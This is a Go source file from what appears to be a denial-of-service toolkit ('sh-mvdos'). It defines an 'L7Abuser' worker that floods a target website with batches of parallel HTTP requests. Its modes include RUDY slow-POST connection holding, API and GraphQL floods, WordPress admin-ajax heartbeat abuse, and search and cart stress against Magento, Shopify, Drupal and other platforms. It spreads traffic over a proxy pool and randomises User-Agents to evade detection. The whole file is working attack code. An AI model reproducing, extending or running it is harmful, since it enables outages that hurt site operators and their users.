package worker

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"

	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
	"github.com/kjsst/sh-mvdos/internal/worker/payload"
	"github.com/kjsst/sh-mvdos/internal/worker/proxy"
)

type L7Abuser struct {
	Target    string
	Workers   int
	Streams   int // parallel in-flight requests per batch step (non-RUDY)
	BatchSize int
	Mode      string
	CMS       string
	ProxyFile string // optional path to proxy list (Slayer -p parity)
}

func (w *L7Abuser) Run(ctx context.Context) (uint64, uint64, error) {
	if w.Workers <= 0 {
		w.Workers = 4
	}
	if w.BatchSize <= 0 {
		w.BatchSize = 50
	}
	mode := strings.ToLower(strings.TrimSpace(w.Mode))
	if mode == "" {
		mode = "baseline"
	}

	clients, err := proxy.ResolvePool(w.ProxyFile, w.Workers)
	if err != nil {
		return 0, 0, err
	}

	var reqs, errs atomic.Uint64
	done := make(chan struct{}, w.Workers)

	for i := 0; i < w.Workers; i++ {
		workerID := i
		client := proxy.Pick(clients, workerID)
		go func() {
			defer func() { done <- struct{}{} }()
			if mode == "rudy" {
				w.runRudyWorker(ctx, client, &reqs, &errs)
				return
			}
			w.runBatchWorker(ctx, mode, workerID, client, &reqs, &errs)
		}()
	}

	<-ctx.Done()
	for i := 0; i < w.Workers; i++ {
		<-done
	}
	return reqs.Load(), errs.Load(), ctx.Err()
}

// runRudyWorker matches Slayer: one slow POST holds a connection until it ends, then retry.
func (w *L7Abuser) runRudyWorker(ctx context.Context, client *http.Client, reqs, errs *atomic.Uint64) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		if err := httpRudy(ctx, w.targetURL(), client); err != nil {
			errs.Add(1)
		} else {
			reqs.Add(1)
		}
	}
}

func (w *L7Abuser) runBatchWorker(ctx context.Context, mode string, workerID int, client *http.Client, reqs, errs *atomic.Uint64) {
	parallel := w.Streams
	if parallel <= 0 {
		parallel = 1
	}
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		batch := w.BatchSize
		for j := 0; j < batch; j++ {
			if ctx.Err() != nil {
				return
			}
			var wg sync.WaitGroup
			wg.Add(parallel)
			for k := 0; k < parallel; k++ {
				seq := j*parallel + k
				go func(seq int) {
					defer wg.Done()
					if err := w.fireOnce(ctx, mode, workerID, seq, client); err != nil {
						errs.Add(1)
					} else {
						reqs.Add(1)
					}
				}(seq)
			}
			wg.Wait()
		}
	}
}

func (w *L7Abuser) targetURL() string {
	return strings.TrimRight(w.Target, "/")
}

func (w *L7Abuser) fireOnce(ctx context.Context, mode string, workerID, seq int, client *http.Client) error {
	switch mode {
	case "httpget", "get":
		return w.get(ctx, w.pathForMode(seq), client)
	case "httppost", "post":
		return httpPost(ctx, w.targetURL(), client)
	case "apiflood", "api":
		return httpAPIFlood(ctx, w.Target, client)
	case "graphql":
		return w.graphqlPost(ctx, client)
	case "wordpress":
		return w.wordpressHeartbeat(ctx, client)
	case "catalog-search", "magento-search", "magento-cart", "magento-guest-cart",
		"shopify-search", "drupal-search", "joomla-search", "wp-search",
		"woocommerce-search", "prestashop-search", "opencart-search", "next-image",
		"cms-rotate", "cmsstress":
		return w.cmsStressOnce(ctx, mode, seq, client)
	case "baseline":
		if seq%2 == 0 {
			return w.get(ctx, w.pathForMode(seq), client)
		}
		return httpPost(ctx, w.targetURL(), client)
	default:
		return w.get(ctx, w.pathForMode(seq), client)
	}
}

func (w *L7Abuser) get(ctx context.Context, path string, client *http.Client) error {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, w.targetURL()+path, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", evasion.RandUA())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Connection", "keep-alive")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func (w *L7Abuser) graphqlPost(ctx context.Context, client *http.Client) error {
	body := payload.GraphQLBody()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, w.targetURL()+"/graphql", strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", evasion.RandUA())
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func (w *L7Abuser) wordpressHeartbeat(ctx context.Context, client *http.Client) error {
	body := payload.WordPressHeartbeat()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, w.targetURL()+"/wp-admin/admin-ajax.php", strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", evasion.RandUA())
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Referer", w.targetURL()+"/wp-admin/")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func (w *L7Abuser) pathForMode(i int) string {
	switch strings.ToLower(w.Mode) {
	case "wordpress":
		return "/wp-admin/admin-ajax.php?action=heartbeat"
	case "graphql":
		return "/graphql"
	default:
		if i%3 == 0 {
			return "/"
		}
		return fmt.Sprintf("/p/%d", i+rand.Intn(1000))
	}
}